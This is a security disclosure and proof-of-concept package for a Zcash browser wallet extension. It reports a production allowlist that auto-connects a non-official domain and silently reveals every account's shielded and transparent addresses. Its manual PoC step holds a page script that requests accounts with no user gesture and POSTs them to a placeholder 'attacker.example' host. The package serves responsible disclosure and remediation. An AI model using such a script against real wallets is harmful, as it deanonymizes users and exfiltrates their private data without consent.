# H-1 PoC package — Privileged auto-connect allowlist (`noirdevelop.refburrow.top`)

**Finding:** The production Noir Wallet extension hard-codes a privileged "first-party" auto-connect allowlist that skips the dApp connection-consent UI and silently authorizes **all** accounts (returning every account's transparent **and shielded** addresses). Besides the official `app.zknoir.com`, the list contains `https://noirdevelop.refburrow.top` — a non-official `.top` domain that is a CNAME to a Cloudflare Pages *develop* deployment (`noir-dashboard-develop.pages.dev`).

This document records reproducible evidence produced during the engagement, what could **not** be reproduced in the sandbox and why, and exact manual steps to complete a full live demonstration.

---

## Evidence 1 (reproducible, executed) — the shipped policy classifies the rogue origin as privileged

Script: `noirwallet-H1-poc-tier1.mjs` (imports the **real** shipped module, not a copy). Point the import path at a local checkout of `NoirWallet/noir-wallet` and run with Node ≥ 22:

```
node --experimental-strip-types noirwallet-H1-poc-tier1.mjs
```

The script imports `packages/extension/src/core/dapp/first-party-policy.ts` and calls its exported functions. Observed output:

```json
{
  "shouldAutoConnectDApp(rogue)": true,
  "shouldAutoConnectDApp(official)": true,
  "shouldAutoConnectDApp(random attacker)": false,
  "scopeLimit(rogue)": 64,
  "scopeLimit(random)": 16
}

TIER-1 RESULT: PROVEN — rogue origin is auto-connect + elevated scope
```

→ `https://noirdevelop.refburrow.top` is treated as a first-party origin (auto-connect) and granted an elevated session-scope limit of 64 (vs 16 for normal sites). A random attacker origin is correctly rejected, confirming the allowlist is the discriminator.

## Evidence 2 (reproducible, executed) — the allowlist ships in the PRODUCTION build (not dev-stripped)

Built the extension from a clean checkout (WASM is vendored, so no Rust toolchain is required):

```
cd packages/extension
pnpm install
npx vite build            # outputs dist/  (manifest name "Noir Wallet", version 2.0.0)
grep -r "refburrow.top" dist/assets/
```

Observed in `dist/assets/runtime-message-security-*.js`:

```js
Set(["https://app.zknoir.com","https://noirdevelop.refburrow.top"]);
```

→ The rogue origin is present verbatim in the shipped production bundle. It is **not** behind a dev/test flag (contrast the conformance-signing RPCs, which are compiled out unless `PLAYWRIGHT_E2E=1`). This rebuts a "dev-only / not in production" triage response.

## Evidence 3 (source trace) — what auto-connect grants, with no approval UI

`packages/extension/src/background/dapp-handler.ts`:
- `requestAccounts` (`:491-492`): `if (shouldAutoConnectDApp(origin) && canAutoConnect(origin)) chosen = await this.authorizeAllWalletAccounts(origin)` — the `else` branch (`runConnectApproval`) that opens the approval window is skipped.
- `getAccounts` (`:377-382`): same auto-authorization on a silent read.
- `ensurePermission` (`:1985-1988`): auto-passes for these origins.
- `authorizeAllWalletAccounts` (`:738+`) → `buildAllWalletAccounts()` authorizes **every account of every wallet** and returns `{ transparent, shielded, accounts[] }`.
- `canAutoConnect` (`core/dapp/dapp-manager.ts:1279-1283`) returns `true` for a never-before-seen origin (state `undefined`), so the very first visit succeeds.

→ An allowlisted origin, with no user interaction, obtains every account's transparent **and shielded** address. For a privacy-focused Zcash wallet, silent shielded-address disclosure is a deanonymization of the wallet's core protected secret.

---

## What was NOT reproduced in the sandbox, and why (honest limitation)

A fully-live browser demonstration of *addresses being exfiltrated zero-click* additionally requires:

1. **Beta activation.** dApp requests are gated by `betaInviteActivation.isActivated()` (`background/index.ts:2520`). While inactive, `zcash_requestAccounts` returns `{kind:'activate'}` (opens a beta-invite window) and `zcash_getAccounts` returns silent `null` — for **all** origins, *before* the auto-connect logic (`core/dapp/beta-invite-policy.ts`). Activation requires a server-validated invite code (`infrastructure/wallet/beta-invite-api.ts` → `bindCode`). No invite code / server was available in this sandbox.
2. **A created, unlocked wallet** (seed + password) with the Zcash runtime initialized.

These are environmental blockers, not evidence the bug is absent — Evidence 1–3 establish the vulnerable code path concretely. **Mitigation note / severity input:** because dApp features require per-install beta activation, *current* real-world blast radius is limited to activated installs. Activation is the intended user flow for this (actively promoted) beta, so once a user activates — the expected state — every auto-connect visit to the rogue origin exposes their full address set. This supports a **High** rating, rising to **Critical** if the origin is attacker-controllable (Cloudflare Pages dangling-CNAME/project takeover, or domain lapse) or hosts an XSS.

## Manual steps to complete a full live PoC (for a triager with beta access)

1. Load `dist/` as an unpacked extension in Chrome; create a wallet (seed + password) and activate the beta with a valid invite code; keep it unlocked.
2. Serve a page whose origin is `https://noirdevelop.refburrow.top` (the maintainers control the real origin; a triager can prove the behavior by temporarily adding a throwaway origin they control to `AUTO_CONNECT_DAPP_ORIGINS` in a local build, or by using an internal build pointed at the real origin).
3. On page load, run — with **no** user gesture:
   ```html
   <script>
     const r = await window.noirwallet.zcash.requestAccounts();
     // r.shielded / r.transparent / r.accounts[] returned with NO approval dialog
     fetch('https://attacker.example/collect', {method:'POST', body: JSON.stringify(r)});
   </script>
   ```
4. Observe: no connection-approval window opens, and every account's shielded + transparent address is returned. Compare with any non-allowlisted origin, where an approval window is shown first.

## Recommended fixes
- Remove `https://noirdevelop.refburrow.top` from the production allowlist; never ship develop/staging origins with production auto-connect (gate any dev auto-connect behind a dev build flag).
- Audit the Cloudflare Pages custom-domain for dangling-CNAME/takeover exposure.
- Require CODEOWNERS/security review for `first-party-policy.ts`; investigate why this entry entered via an unrelated `fix(rpc)` commit (`6b91c8d`).
- Consider requiring an explicit one-time user consent even for first-party origins.
